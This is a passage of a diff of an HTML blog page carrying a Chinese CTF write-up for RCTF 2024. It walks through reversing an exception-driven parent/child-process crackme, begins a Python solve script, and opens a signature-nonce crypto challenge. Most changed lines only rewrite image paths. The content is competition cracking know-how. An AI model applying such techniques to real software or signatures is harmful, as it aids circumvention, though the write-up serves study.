 </span></span></code></pre></div><p>关键在于其中的几个处理子进程异常的逻辑</p>
-<p><img src="/img/2024-05-27-RCTF/fd3463bb362f4d232b2a7d0a4a2ce55b.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/fd3463bb362f4d232b2a7d0a4a2ce55b.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>子进程中就触发不同的异常来推动父进程的执行，比如下面开始的CC就是一个软件断点异常</p>
-<p><img src="/img/2024-05-27-RCTF/06e323b3c9af628266176d7bb501f9cc.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/06e323b3c9af628266176d7bb501f9cc.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>这样父进程中就会接管这个异常，并对子进程中的代码进行解密</p>
-<p><img src="/img/2024-05-27-RCTF/3e74199dbbf6e1890124459e4c20f885.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/3e74199dbbf6e1890124459e4c20f885.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>剩下的流程可以直接调试父进程来确定，</p>
 <p>先对输入进行了异或</p>
-<p><img src="/img/2024-05-27-RCTF/3cd1bb2e6c5a427d115600c3f0d27f9f.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/3cd1bb2e6c5a427d115600c3f0d27f9f.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>接着进行移位运算</p>
-<p><img src="/img/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/86aa97f47c21e02ec270422ab6341c24.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>然后是一个rc4</p>
-<p><img src="/img/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/86aa97f47c21e02ec270422ab6341c24.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>最后对比</p>
-<p><img src="/img/2024-05-27-RCTF/86aa97f47c21e02ec270422ab6341c24.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/86aa97f47c21e02ec270422ab6341c24.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <p>一层一层逆向解密即可</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">enc</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x00000080</span><span class="p">,</span> <span class="mh">0x00000005</span><span class="p">,</span> <span class="mh">0x000000E3</span><span class="p">,</span> <span class="mh">0x0000002F</span><span class="p">,</span> <span class="mh">0x00000018</span><span class="p">,</span> <span class="mh">0x0000002F</span><span class="p">,</span> <span class="mh">0x000000C5</span><span class="p">,</span> <span class="mh">0x0000008C</span><span class="p">,</span> <span class="mh">0x00000025</span><span class="p">,</span> <span class="mh">0x00000070</span><span class="p">,</span> <span class="mh">0x000000BC</span><span class="p">,</span> <span class="mh">0x00000005</span><span class="p">,</span> <span class="mh">0x0000001C</span><span class="p">,</span> <span class="mh">0x0000004F</span><span class="p">,</span> <span class="mh">0x000000F2</span><span class="p">,</span> <span class="mh">0x00000002</span><span class="p">,</span> <span class="mh">0x000000E5</span><span class="p">,</span> <span class="mh">0x0000003E</span><span class="p">,</span> <span class="mh">0x00000002</span><span class="p">,</span> <span class="mh">0x0000002F</span><span class="p">,</span> <span class="mh">0x000000E5</span><span class="p">,</span> <span class="mh">0x00000011</span><span class="p">,</span> <span class="mh">0x000000A3</span><span class="p">,</span> <span class="mh">0x000000C0</span><span class="p">,</span> <span class="mh">0x00000000</span><span class="p">]</span><span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl"><span class="n">x1</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x3A</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x0A</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0xDE</span><span class="p">,</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xB1</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0x2E</span><span class="p">,</span> <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span> <span class="mh">0xDA</span><span class="p">,</span> <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xF8</span><span class="p">,</span> <span class="mh">0xF2</span><span class="p">,</span> <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">]</span>
@@ -1038,7 +1264,12 @@
 </span></span></code></pre></div><h2 id="2048">2048</h2>
 <p>初始10000分，最终要1000000分，每次赢一盘最多加当前的分数</p>
 <p>大概玩十几遍2048就可以了（泪目）</p>
-<p><img src="/img/2024-05-27-RCTF/968092825888ad31e980ebd3d5450648.png" alt=""></p>
+<p><img
+  src="/post/rctf-2024-su-wu/968092825888ad31e980ebd3d5450648.png"
+  alt=""
+  loading="lazy"
+>
+</p>
 <h1 id="crypto">Crypto</h1>
 <h2 id="signsystem">SignSystem</h2>
 <p>$$ \begin{aligned} k \cdot s &amp;= hm + x \cdot r \ \text{msb} | k | \text{lsb} &amp;= (hm + x \cdot r) \cdot s^{-1} \end{aligned} $$
